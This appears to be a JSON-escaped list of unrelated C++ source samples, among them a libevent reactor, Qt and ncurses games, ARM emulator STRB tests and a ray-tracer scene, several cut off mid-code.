else if(color==\"AQUA\")\n            system(\"color 03\");\n        else if(color==\"ORANGE\")\n            system(\"color 0C\");\n\n        if(i!=i2)\n        {\n        if(station[*(i2)].color!=station[*(i)].color)\n        {\n            pos_x=8;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n            cout<<\"{change from \"<<station[*i2].color<<\" to \"<<station[*i].color<<\"}\";\n            pos_x=12;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n        }\n        i2--;\n        }\n        str=station[*i].name;\n        if(pos_x+5+str.size()<106)\n        {\n            gotoxy(pos_x,pos_y);\n            cout<<\" ->> \"<<str;\n            pos_x=pos_x+str.size()+5;\n        }\n        else\n        {\n            pos_x=12;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n            cout<<\" ->> \"<<str;\n            pos_x=pos_x+str.size()+5;\n        }\n        n_of_stations++;\n        delay(700);\n    }\n    if(!inter)\n    {\n      gotoxy(12,++pos_y);\n      cout<<\"INTERMEDIATE STATION\";\n      pos_y++;\n      pos_x=12;\n    }\n\n    if(inter){\n    delay(1000);\n    gotoxy(72,11);\n    cout<<\"PATH LENGTH IS :\";\n    gotoxy(97,11);\n    cout<<d<<\" KM\";\n    delay(1000);\n    gotoxy(16,10);\n    cout<<\"AVERAGE TIME : \";\n    gotoxy(39,10);\n    cout<<timetaken(d)<<\" MIN\";\n    delay(1000);\n    gotoxy(72,10);\n    cout<<\"AVERAGE FARE : \";\n    gotoxy(94,10);\n    cout<<\" Rs. \"<<money(d);\n    delay(",
    "#include \"Reactor.h\"\nXReactor::XReactor():pConf(nullptr),pEventBase(nullptr), pListener(nullptr) {\n\tInit();\n}\nXReactor::~XReactor() {\n\tClose();\n\tif (m_thread.joinable()) {\n\t\tm_thread.join();\n\t}\n}\n\nint64_t XReactor::Init() {\n\tif (pEventBase!=nullptr) {\n\t\tLOG(INFO)(\"libevent has init!\");\n\t\tif (pBufEv != nullptr) {\n\t\t\tLOG(INFO)(\"bufferevent has init!\");\n\t\t}\n\t\telse {\n\t\t\tpBufEv= bufferevent_socket_new(pEventBase, -1, 0);\n\t\t\tLOG(INFO)(\"bufferevent is init!\");\n\t\t} \n\t\t\n\t\treturn 0;\n\t}\n\t\n\t//\u5ffd\u7565\u7ba1\u9053\u4fe1\u53f7\uff0c\u9632\u6b62\u53d1\u9001\u6570\u636e\u7ed9\u5df2\u5173\u95ed\u7684socket\u5bfc\u81f4\u7a0b\u5e8fdump\n\tif (signal(SIGPIPE, SIG_IGN) == SIG_ERR) {\n\t\treturn 1;\n\t}\n\t//\u521b\u5efa\u914d\u7f6e\u4e0a\u4e0b\u6587\n\tpConf = event_config_new();\n\n\t//\u8bbe\u7f6e\u7279\u5f81\n\t//event_config_require_features(pConf, EV_FEATURE_FDS);\n\t//\u8bbe\u7f6e\u7f51\u7edc\u6a21\u578b\n\tevent_config_avoid_method(pConf, \"epoll\");\n\t\n\tpEventBase = event_base_new_with_config(pConf);\n\tif (pEventBase==nullptr) {\n\t\tLOG(ERROR)(\"Could not initialize libevent!\");\n\t\treturn 1;\n\t}\n\telse {\n\t\tLOG(INFO)(\"libevent is init!\");\n\t}\n\tevent_config_free(pConf);\n\tLOG(INFO)(\"Reactor is init!\");\n\treturn 0;\n}\nint64_t XReactor::CreateServer() {\n\tpBufEv = bufferevent_socket_new(pEventBase, -1, 0);\n\tif (pBufEv == nullptr) {\n\t\tLOG(ERROR)(\"Could not initialize bufferevent!\");\n\t\treturn 1;\n\t}\n\telse {\n\t\tLOG(INFO)(\"bufferevent is init!\");\n\t}\n\tif (pListener!=nullptr) {\n\t\tevconnlistener_free(pListener);\n\t\tLOG(INFO)(\"last listener is free!\");\n\t}\n\tsin.sin_family = AF_INET;\n\tsin.sin_port = htons(nPort);\n\n\tpListener = evconnlistener_new_bind(pEventBase, listener_cb, (void*)this,\n\t\tLEV_OPT_REUSEABLE | LEV_OPT_CLOSE_ON_FREE, -1,\n\t\t(sockaddr*)&sin,\n\t\tsizeof(sin));\n\n\tif (!pListener) {\n\t\tLOG(ERROR)(\"Could not create a listener!\");\n\t\treturn 1;\n\t}\n\tLOG(INFO)(\"Create a listener success!\");\n\treturn 0;\n}\n\nvoid XReactor::run() {\n\t//\u7531\u4e8eevent_base_dispatch\u662f\u4e00\u4e2aloop\u5faa\u73af\uff0c\u6240\u4ee5\u8981\u521b\u5efa\u7ebf\u7a0b\u6765\u4fdd\u8bc1\u672c\u65b9\u6cd5\u7ee7\u7eed\u6267\u884c\n\tm_thread = std::thread(event_base_dispatch, pEventBase);\n\tLOG(INFO)(\"All events start Looping!\");\n\treturn;\n}\n\n\nint64_t XReactor::connectServer(int port)\n{\n\tpBufEv = bufferevent_socket_new(pEventBase, -1, 0);\n\tif (pBufEv == nullptr) {\n\t\tLOG(ERROR)(\"Could not initialize bufferevent!\");\n\t\treturn 1;\n\t}\n\telse {\n\t\tLOG(INFO)(\"bufferevent is init!\");\n\t}\n\t//\u8bbe\u7f6e\u56de\u8c03\u51fd\u6570, \u53ca\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\n\tbufferevent_setcb(pBufEv, read_callback, NULL, event_callback, this);\n\tmemset(&sin, 0, sizeof(sin));\n\tsin.sin_family = AF_INET;\n\tsin.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\tsin.sin_port = htons(nPort);\n\n\t//\u8fde\u63a5\u670d\u52a1\u5668\n\tif (bufferevent_socket_connect(pBufEv, (struct sockaddr*)&sin, sizeof(sin)) ==-1) {\n\t\tLOG(ERROR)(\"connect server failed!\");\n\t\treturn -1;\n\t}\n\tLOG(INFO)(\"connect server success!\");\n\treturn 0;\n}\n\nbool XReactor::Close() {\n\tif (pListener != nullptr) {\n\t\tevconnlistener_free(pListener);\n\t}\n\tif (pBufEv != nullptr) {\n\t\tbufferevent_free(pBufEv);\n\t}\n\tif (pConf!=nullptr) {\n\t\tevent_config_free(pConf);\n\t}\n\tif (pEventBase != nullptr) {\n\t\tevent_base_free(pEventBase);\n\t}\t\n\treturn true;\n\t\n\t\n}\n\n\nvoid XReactor::listener_cb(evconnlistener* pListener, evutil_socket_t fd,\n\tstruct sockaddr* sa, int socklen, void* user_data)\n{\n\tevent_base* pEventBase = static_cast<XReactor*>(user_data)->pEventBase;\n\tbufferevent* bev=nullptr;\n\n\tbev = bufferevent_socket_new(pEventBase, fd, BEV_OPT_CLOSE_ON_FREE);\n\tif (!bev) {\n\t\tLOG(ERROR)(\"Error constructing bufferevent!\");\n\t\t//event_base_loopbreak(pEventBase);\n\t\treturn;\n\t}\n\tbufferevent_setcb(bev, NULL, conn_writecb, conn_eventcb, user_data);\n\t// \u8bbe\u7f6e\u5199\u64cd\u4f5c\u7684\u4f4e\u6c34\u4f4d\u4e3a1024\u5b57\u8282\n\tbufferevent_setwatermark(bev, EV_WRITE,0 ,0);\n\n\tbufferevent_enable(bev, EV_WRITE);\n\tbufferevent_disable(bev, EV_READ);\n\t\n}\n\nvoid XReactor::conn_writecb(bufferevent* bev,  void* user_data)\n{\n\t//TODO\n\tXReactor* pthis = static_cast<XReactor*>(user_data);\n\t{\n\t\tstd::unique_lock<std::mutex> mtx(pthis->m_mtx);\n\t\tif (pthis->v_message.size()) {\n\t\t\tfor (auto& item : pthis->v_message) {\n\t\t\t\tbufferevent_write(bev, item.c_str(), item.size());\n\t\t\t}\n\t\t}\n\t\tpthis->v_message.clear();\n\t}\n\n\t\n}\n\nvoid XReactor::SendData() {\n\tstd::unique_lock<std::mutex> mtx(m_mtx);\n\tif (v_message.size()) {\n\t\tfor (auto& item : v_message) {\n\t\t\tbufferevent_write(pBufEv, item.c_str(), item.size());\n\t\t}\n\t}\n\tv_message.clear();\n}\n\nvoid XReactor::conn_eventcb(bufferevent* bev, short events, void* user_data)\n{\n\tif (events & BEV_EVENT_EOF) {\n\t\tLOG(INFO)(\"Connection closed.\\n\");\n\t}\n\telse if (events & BEV_EVENT_ERROR) {\n\t\tLOG(ERROR)(\"Got an error on the connection: {}\",\n\t\t\tstrerror(errno));/*XXX win32*/\n\t}\n\t/* None of the other events can happen here, since we haven't enabled\n\t * timeouts */\n\tbufferevent_free(bev);\n}\n\n//\u8bfb\u56de\u8c03\u5904\u7406\nvoid XReactor::read_callback(bufferevent* pBufEv, void* pArg) {\n\tXReactor* pthis = (XReactor*)pArg;\n\t//\u83b7\u53d6\u8f93\u5165\u7f13\u5b58\n\tevbuffer* pInput = bufferevent_get_input(pBufEv);\n\t//\u83b7\u53d6\u8f93\u5165\u7f13\u5b58\u6570\u636e\u7684\u957f\u5ea6\n\tint nLen = evbuffer_get_length(pInput);\n\t//\u83b7\u53d6\u6570\u636e\u7684\u5730\u5740\n\tconst char* pBody = (const char*)evbuffer_pullup(pInput, nLen);\n\t//\u8fdb\u884c\u6570\u636e\u5904\u7406\n\tpthis->GetData(pBody,nLen);\n\tevbuffer_drain(pInput, nLen);\n\t//\u5199\u5230\u8f93\u51fa\u7f13\u5b58,\u7531bufferevent\u7684\u53ef\u5199\u4e8b\u4ef6\u8bfb\u53d6\u5e76\u901a\u8fc7fd\u53d1\u9001\n\t//bufferevent_write(pBufEv, pResponse, nResLen);\n\treturn;\n}\n\n//\u5199\u56de\u8c03\u5904\u7406\nvoid XReactor::write_callback(bufferevent* pBufEv,short sEvent, void* pArg) {\n\treturn;\n}\n\n//\u4e8b\u4ef6\u56de\u8c03\u5904\u7406\nvoid XRea",
    "#include \"ellipse.h\"\n\nEllipse::Ellipse()\n{\n    connect(this, &Ellipse::borderChanged, this, &Ellipse::onPropertyChanged);\n    connect(this, &Ellipse::colorChanged, this, &Ellipse::onPropertyChanged);\n}\n\nvoid Ellipse::setProperties(float newBorder, QColor newColor)\n{\n    setBorder(newBorder);\n    \n    if (m_color != newColor) {\n        m_color = newColor;\n        emit colorChanged();\n    }\n}\n\nvoid Ellipse::paint(QPainter *painter)\n{\n    QPen pen(m_color, m_border);\n    painter->setPen(pen);\n    painter->setRenderHints(QPainter::Antialiasing, true);\n    painter->drawEllipse(QRect(m_border / 2, m_border / 2, width() - m_border, height() - m_border));\n}\n\nvoid Ellipse::ellipseInfo()\n{\n    qInfo() << QString(\"Ellipse's color: %1 - Ellipse's border: %2\")\n                   .arg(m_color.name())\n                   .arg(m_border);\n}\n\nvoid Ellipse::onPropertyChanged()\n{\n    update();\n}\n\nfloat Ellipse::border() const\n{\n    return m_border;\n}\n\nvoid Ellipse::setBorder(float newBorder)\n{\n    if (qFuzzyCompare(m_border, newBorder))\n        return;\n    m_border = newBorder;\n    emit borderChanged();\n}\n",
    "#include <iostream>\n#include <unistd.h>\n#include <ncurses.h>\n#include <ctime>\n\nvoid gotoxy(int x, int y) {\n    move(y, x);\n    refresh();\n}\n\nvoid delay(unsigned int mseconds) {\n    usleep(mseconds * 1000);  // usleep takes microseconds\n}\n\nvoid getup() {\n    clear();\n    gotoxy(10, 2);\n    printw(\"Press X to Exit, Press Space to Jump\");\n    gotoxy(62, 2);\n    printw(\"SCORE : \");\n    gotoxy(1, 25);\n    for (int x = 0; x < 79; x++)\n        printw(\"\u00df\");\n    refresh();\n}\n\nint t = 0, speed = 40;\n\nvoid ds(int jump = 0) {\n    static int a = 1;\n\n    if (jump == 0)\n        t = 0;\n    else if (jump == 2)\n        t--;\n    else \n        t++;\n\n    gotoxy(2, 15 - t);\n    printw(\"                 \");\n    gotoxy(2, 16 - t);\n    printw(\"         \u00dc\u00db\u00df\u00db\u00db\u00db\u00db\u00dc\");\n    gotoxy(2, 17 - t);\n    printw(\"         \u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00db\");\n    gotoxy(2, 18 - t);\n    printw(\"         \u00db\u00db\u00db\u00db\u00db\u00df\u00df\u00df\");\n    gotoxy(2, 19 - t);\n    printw(\" \u00db      \u00dc\u00db\u00db\u00db\u00db\u00df\u00df\u00df \");\n    gotoxy(2, 20 - t);\n    printw(\" \u00db\u00db\u00dc  \u00dc\u00db\u00db\u00db\u00db\u00db\u00db\u00dc\u00dc\u00dc \");\n    gotoxy(2, 21 - t);\n    printw(\" \u00df\u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00db  \u00df \");\n    gotoxy(2, 22 - t);\n    printw(\"   \u00df\u00db\u00db\u00db\u00db\u00db\u00db\u00db\u00df     \");\n    gotoxy(2, 23 - t);\n    if (jump == 1 || jump == 2) {\n        printw(\"    \u00db\u00db\u00df \u00df\u00db       \");\n        gotoxy(2, 24 - t);\n        printw(\"    \u00db\u00dc   \u00db\u00dc      \");\n    } else if (a == 1) {\n        printw(\"    \u00df\u00db\u00db\u00df  \u00df\u00df\u00df    \");\n        gotoxy(2, 24 - t);\n        printw(\"      \u00db\u00dc         \");\n        a = 2;\n    } else if (a == 2) {\n        printw(\"     \u00df\u00db\u00dc \u00df\u00db      \");\n        gotoxy(2, 24 - t);\n        printw(\"          \u00db\u00dc     \");\n        a = 1;\n    }\n    gotoxy(2, 25 - t);\n    if (jump != 0) {\n        printw(\"                \");\n    } else {\n        printw(\"\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\u00df\");\n    }\n    refresh();\n    delay(speed);\n}\n\nvoid obj() {\n    static int x = 0, scr = 0;\n    if (x == 56 && t < 4) {\n        scr = 0;\n        speed = 40;\n        gotoxy(36, 8);\n        printw(\"Game Over\");\n        getch();\n        gotoxy(36, 8);\n        printw(\"         \");\n    }\n    gotoxy(74 - x, 20);\n    printw(\"\u00db    \u00db \");\n    gotoxy(74 - x, 21);\n    printw(\"\u00db    \u00db \");\n    gotoxy(74 - x, 22);\n    printw(\"\u00db\u00dc\u00dc\u00dc\u00dc\u00db \");\n    gotoxy(74 - x, 23);\n    printw(\"  \u00db    \");\n    gotoxy(74 - x, 24);\n    printw(\"  \u00db  \");\n    x++;\n    if (x == 73) {\n        x = 0;\n        scr++;\n        gotoxy(70, 2);\n        printw(\"     \");\n        gotoxy(70, 2);\n        printw(\"%d\", scr);\n        if (speed > 20)\n            speed--;\n    }\n    refresh();\n}\n\nint main() {\n    initscr();\n    cbreak();\n    noecho();\n    keypad(stdscr, TRUE);\n    nodelay(stdscr, TRUE);\n\n    int ch;\n    getup();\n    while (true) {\n        while ((ch = getch()) == ERR) {\n            ds();\n            obj();\n        }\n        if (ch == ' ') {\n            for (int i = 0; i < 10; i++) {\n                ds(1);\n                obj();\n            }\n            for (int i = 0; i < 10; i++) {\n                ds(2);\n                obj();\n            }\n        } else if (ch == 'x') {\n            endwin();\n            return 0;\n        }\n    }\n}\n\n\n\nuse :\ng++ -o game game.cpp -lncurses \nTo Run\n",
    "#include \"Arm/ArmTest.h\"\n\nclass StoreByteImmediatePreIndexedTest: public ArmTest {};\n\nTEST_F(StoreByteImmediatePreIndexedTest, ZeroOffset) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $DD\"\n    });\n    When({\n        \"STRB R1, [R2]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $88\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest, PositiveOffset) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008020).B is $DD\"\n    });\n    When({\n        \"STRB R1, [R2, #0x20]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008020).B is $88\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest, NonAlignedPositiveOffset) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008021).B is $DD\"\n    });\n    When({\n        \"STRB R1, [R2, #0x21]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008021).B is $88\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest, NegativeOffset) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008020).B is $DD\"\n    });\n    When({\n        \"STRB R1, [R2, #-0x20]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00007FE0).B is $88\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest, NonAlignedNegativeOffset) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00008020).B is $DD\"\n    });\n    When({\n        \"STRB R1, [R2, #-0x21]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $55667788\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $44\",\n        \"($00007FDF).B is $88\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest,\n       ProgramCounterIsPlus12AndPSRBitsArePresentedWhenR15IsInRdPosition) {\n    Given({\n        \"PSR is NZI,SVC\",\n        \"PC is $00001008\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $77\"\n    });\n    When({\n        \"STRB R15, [R2, #0x0]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is NZI,SVC\",\n        \"PC is $0000100C\",\n        \"R2 is $00008000\",\n        \"($00008000).B is $0F\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest,\n       ProgramCounterIsPlus8AndPSRBitsAreNotPresentedWhenR15IsInRnPosition) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $AABBCCDD\",\n        \"($00001708).B is $77\",\n        \"($0000170C).B is $22\"\n    });\n    When({\n        \"STRB R1, [R15, #0x700]\"\n    });\n    Then({\n        \"CYCLES is NN\",\n        \"PSR is 0,SVC\",\n        \"PC is $0000100C\",\n        \"R1 is $AABBCCDD\",\n        \"($00001708).B is $DD\",\n        \"($0000170C).B is $22\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest,\n       AddressExceptionIsTakenWhenTheTransferAddressIsOutside26BitRange) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $AABBCCDD\",\n        \"R2 is $03FFFFF0\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    });\n    When({\n        \"STRB R1, [R2, #0x10]\"\n    });\n    Then({\n        \"CYCLES is NNNS\",\n        \"PSR is I,SVC\",\n        \"PC is $0000001C\",\n        \"R1 is $AABBCCDD\",\n        \"R2 is $03FFFFF0\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $0000100B\"\n    });\n}\n\nTEST_F(StoreByteImmediatePreIndexedTest,\n       DataAbortExceptionIsTakenWhenTheMemoryManagementSystemSignalsAbort) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R1 is $AABBCCDD\",\n        \"R2 is $00008000\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\",\n        \"($00008000).W is ABORT\"\n    });\n    When({\n        \"STRB R1, [R2, #0x0]\"\n    });\n    Then({\n        \"CYCLES is NNNS\",\n        \"PSR is I,SVC\",\n        \"PC is $00000018\",\n        \"R1 is $AABBCCDD\",\n        \"R2 is $00008000\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $0000100B\"\n    });\n}\n\nTEST_F(",
    "#include \"rt_utilities.h\"\r\n\r\n#include \"camera.h\"\r\n#include \"hittable.h\"\r\n#include \"hittable_list.h\"\r\n#include \"material.h\"\r\n#include \"sphere.h\"\r\n\r\nint main() {\r\n\r\n    hittable_list world;\r\n\r\n    auto ground_material = make_shared<lambertian>(color(0.5, 0.5, 0.5));\r\n    world.add(make_shared<sphere>(point3(0,-1000,0), 1000, ground_material));\r\n\r\n    for (int a = -11; a < 11; a++) {\r\n        for (int b = -11; b < 11; b++) {\r\n            auto choose_mat = random_double();\r\n            point3 center(a + 0.9*random_double(), 0.2, b + 0.9*random_double());\r\n            if ((center - point3(4, 0.2, 0)).length() > 0.9) {\r\n                shared_ptr<material> sphere_material;\r\n                if (choose_mat < 0.8) {\r\n                    auto albedo = color::random() * color::random();\r\n                    sphere_material = make_shared<lambertian>(albedo);\r\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\r\n                } else if (choose_mat < 0.95) {\r\n                    auto albedo = color::random(0.5, 1);\r\n                    auto fuzz = random_double(0, 0.5);\r\n                    sphere_material = make_shared<metal>(albedo, fuzz);\r\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\r\n                } else {\r\n                    sphere_material = make_shared<dielectric>(1.5);\r\n                    world.add(make_shared<sphere>(center, 0.2, sphere_material));\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    auto material1 = make_shared<dielectric>(1.5);\r\n    world.add(make_shared<sphere>(point3(0,1,0), 1.0, material1));\r\n\r\n    auto material2 = make_shared<lambertian>(color(0.4, 0.2, 0.1));\r\n    world.add(make_shared<sphere>(point3(-4,1,0), 1.0, material2));\r\n\r\n    auto material3 = make_shared<metal>(color(0.7, 0.6, 0.5), 0.0);\r\n    world.add(make_shared<sphere>(point3(4,1,0), 1.0, material3));\r\n\r\n    camera cam;\r\n\r\n    cam.aspect_ratio = 16.0 / 9.0;\r\n    cam.image_width = 1200;\r\n    cam.samples_per_pixel = 500;\r\n    cam.max_depth = 50;\r\n\r\n    cam.vfov = 20;\r\n    cam.lookfrom = point3(13,2,3);\r\n    cam.lookat = point3(0,0,0);\r\n    cam.viewup = vec3(0,1,0);\r\n\r\n    cam.defocus_angle = 0.6;\r\n    cam.focus_dist = 10.0;\r\n\r\n    cam.render(world);\r\n\r\n}\r\n",
    "\ufeff#include \"common/precompiled.h\"\n\n#include \"parser/parser.h\"\n\n#include \"meta_info.h\"\n\nMetaInfo::MetaInfo(const Cursor& cursor)\n{\n    for (auto& child : cursor.getChildren())\n    {\n\n        if (child.getKind() != CXCursor_AnnotateAttr)\n            continue;\n\n        for (auto& prop : extractProperties(child))\n            m_properties[prop.first] = prop.second;\n    }\n}\n\nstd::string MetaInfo::getProperty(const std::string& key) const\n{\n    auto search = m_properties.find(key);\n\n    // use an empty string by default\n    return search == m_properties.end() ? \"\" : search->second;\n}\n\nbool MetaInfo::getFlag(const std::string& key) const { return m_properties.find(key) != m_properties.end(); }\n\nstd::vector<MetaInfo::Property> MetaInfo::extractProperties(const Cursor& cursor) const\n{\n    std::vector<Property> ret_list;\n\n    auto propertyList = cursor.getDisplayName();\n\n    auto&& properties = Utils::split(propertyList, \",\");\n\n    static const std::string white_space_string = \" \\t\\r\\n\";\n\n    for (auto& property_item : properties)\n    {\n        auto&& item_details = Utils::split(property_item, \":\");\n        auto&& temp_string  = Utils::trim(item_details[0], white_space_string);\n        if (temp_string.empty())\n        {\n            continue;\n        }\n        ret_list.emplace_back(temp_string,\n                              item_details.size() > 1 ? Utils::trim(item_details[1], white_space_string) : \"\");\n    }\n    return ret_list;\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n#include<QKeyEvent>\r\n\r\nMainWindow::MainWindow(QWidget *parent) :\r\n    QMainWindow(parent),\r\n    ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    this->main2=new MainWindow2;\r\n    this->main3=new GameOver;\r\n    //mTank.HP=settings::readSettings(\"Hp:\").toInt();\r\n\r\n    //hp=settings::readSettings(\"Hp:\").toInt();\r\n\r\n    //mTank.mTankSpeed=settings::readSettings(\"Speed:\").toInt();\r\n\r\n    //mtankspeed=settings::readSettings(\"Speed:\").toInt();\r\n\r\n    //Fire=settings::readSettings(\"Fire:\").toInt();\r\n    this->setFixedSize(1320,790);\r\n\r\n    mGameView.setSceneRect(QRect(0,0,1280,720));\r\n\r\n    mScene.setSceneRect(QRect(0,0,1280,720));\r\n\r\n    mBackGround.setPixmap(QPixmap(\"://90Tank/start/8114UVRG{SC5(IMLK}5XH3D.png\"));\r\n\r\n    mScene.addItem(&mBackGround);\r\n\r\n    mScene.addItem(&mTank);\r\n\r\n    mGameView.setScene(&mScene);\r\n\r\n    mGameView.setParent(this);\r\n\r\n    setCentralWidget(&mGameView);\r\n\r\n    mGameView.show();\r\n\r\n    EnemyBoom();\r\n\r\n    EnemyMove();\r\n\r\n    BossShoot();\r\n\r\n    BossMove();\r\n\r\n    BossBoom();\r\n\r\n    BossCollide();\r\n\r\n    myTankCollide1();\r\n\r\n    myTankCollide2();\r\n\r\n    myTankCollide3();\r\n\r\n    BuildingCollide1();\r\n\r\n    BuildingCollide2();\r\n\r\n    BuildingCollide3();\r\n\r\n    BuildingCollide4();\r\n\r\n    eBulletShoot();\r\n\r\n    bBulletShoot();\r\n\r\n    BulletTime =new QTimer (this);\r\n    BulletTime->start(50);\r\n    connect(BulletTime,&QTimer::timeout,[this](){\r\n        for(auto bullet:mBullet){\r\n            bullet->BulletMove();\r\n        }\r\n    });\r\n    game1();\r\n    Time = new QTimer (this);\r\n    Time->start(100);\r\n    connect(Time,&QTimer::timeout,this,&MainWindow::gameOver);\r\n    Time = new QTimer (this);\r\n    Time->start(300);\r\n    connect(Time,&QTimer::timeout,this,&MainWindow::BulletShoot2);\r\n    connect(this->main3,&GameOver::retry,[=](){\r\n    this->main3->close();\r\n    Time->stop();\r\n    QProcess::startDetached(qApp->applicationFilePath(), QStringList());\r\n    });\r\n}\r\n\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\n\r\nvoid MainWindow::keyPressEvent(QKeyEvent *event){\r\n     mTank.setTransformOriginPoint(mTank.boundingRect().center());\r\n     switch(event->key()){\r\n     case Qt::Key_W:\r\n     {\r\n         mTank.setRotation(0);\r\n         mTank.moveBy(0,-mTank.mTankSpeed);\r\n         break;\r\n     }\r\n     case Qt::Key_S:\r\n    {\r\n        mTank.setRotation(180);\r\n        mTank.moveBy(0,+mTank.mTankSpeed);\r\n        break;\r\n    }\r\n    case Qt::Key_A:\r\n    {\r\n        mTank.setRotation(270);\r\n        mTank.moveBy(-mTank.mTankSpeed,0);\r\n        break;\r\n    }\r\n    case Qt::Key_D:\r\n    {\r\n        mTank.setRotation(90);\r\n        mTank.moveBy(+mTank.mTankSpeed,0);\r\n        break;\r\n    }\r\n     case Qt::Key_J:{\r\n         BulletMove.append(Qt::Key_J);\r\n         break;\r\n     }\r\n     case Qt::Key_K:{\r\n         settings::modifySettings(\"a:\",\"123\");\r\n     }\r\n     };\r\n     if(mTank.x()<0){\r\n         mTank.setX(0);\r\n     }\r\n     if(mTank.y()<0){\r\n         mTank.setY(0);\r\n     }\r\n     if((mTank.x()+mTank.pixmap().width())>1280){\r\n         mTank.setX(1280-mTank.pixmap().width());\r\n     }\r\n     if(mTank.y()+mTank.pixmap().height()>720){\r\n         mTank.setY(720-mTank.pixmap().height());\r\n     }\r\n}\r\n\r\nvoid MainWindow::keyReleaseEvent(QKeyEvent *event)\r\n{\r\n    switch(event->key()){\r\n    case Qt::Key_J:\r\n        BulletMove.removeAll(Qt::Key_J);\r\n        break;\r\n    }\r\n}\r\n\r\nvoid MainWindow::BulletShoot()\r\n{\r\n   QPixmap bulletImg(\"://90Tank/player_tank/girls_preview.png\");\r\n   if(mTank.rotation()==0){\r\n       QPoint pos(mTank.x()+mTank.pixmap().width()/2,mTank.y());\r\n       Bullet* bullet=new Bullet(pos,bulletImg,'N');\r\n       bullet->setRotation(0);\r\n       mScene.addItem(bullet);\r\n       mBullet.append(bullet);\r\n   }\r\n\r\n   if(mTank.rotation()==180){\r\n       QPoint pos(mTank.x()+mTank.pixmap().width()/2,mTank.y()+mTank.pixmap().height());\r\n       Bullet* bullet=new Bullet(pos,bulletImg,'S');\r\n       bullet->setRotation(180);\r\n       mScene.addItem(bullet);\r\n       mBullet.append(bullet);\r\n   }\r\n\r\n   if(mTank.rotation()==90){\r\n       QPoint pos(mTank.x()+mTank.pixmap().width(),mTank.y()+mTank.pixmap().height()/2);\r\n       Bullet* bullet=new Bullet(pos,bulletImg,'E');\r\n       bullet->setRotation(90);\r\n       mScene.addItem(bullet);\r\n       mBullet.append(bullet);\r\n   }\r\n\r\n   if(mTank.rotation()==270){\r\n       QPoint pos(mTank.x(),mTank.y()+mTank.pixmap().height()/2);\r\n       Bullet* bullet=new Bullet(pos,bulletImg,'W');\r\n       bullet->setRotation(270);\r\n       mScene.addItem(bullet);\r\n       mBullet.append(bullet);\r\n   }\r\n}\r\n\r\nvoid MainWindow::BulletShoot2()\r\n{\r\n    for(int keyCode:BulletMove){\r\n        if(keyCode==Qt::Key_J){\r\n            